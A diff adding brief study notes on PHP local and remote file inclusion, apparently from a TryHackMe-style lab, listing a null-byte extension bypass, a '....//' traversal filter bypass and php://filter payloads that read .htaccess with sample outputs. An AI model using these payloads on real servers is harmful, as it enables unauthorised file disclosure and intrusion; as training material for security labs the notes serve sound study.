@@ -1,0 +1,25 @@
+#### File Inclusion
+FIle inclusion:
+Local File Inclusion (LFI), Remote File Inclusion (RFI)
+
+It seems we could move out of the PHP directory but still, the include function reads the input with .php at the end! This tells us that the developer specifies the file type to pass to the include function. To bypass this scenario, we can use the NULL BYTE, which is %00.
+
+http://webapp.thm/index.php?lang=THM
+Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
+
+
+if “../” filtered use “....//.....//”
+
+
+//Advanced
+
+ 
+| Payload                                                                                                  | Output                                                                                                  |
+| php://filter/convert.base64-encode/resource=.htaccess | UmV3cml0ZUVuZ2luZSBvbgpPcHRpb25zIC1JbmRleGVz |
+| php://filter/string.rot13/resource=.htaccess | ErjevgrRatvar ba Bcgvbaf -Vaqrkrf |
+| php://filter/string.toupper/resource=.htaccess | REWRITEENGINE ON OPTIONS -INDEXES |
+| php://filter/string.tolower/resource=.htaccess | rewriteengine on options -indexes |
+| php://filter/string.strip_tags/resource=.htaccess | RewriteEngine on Options -Indexes |
+
+
+
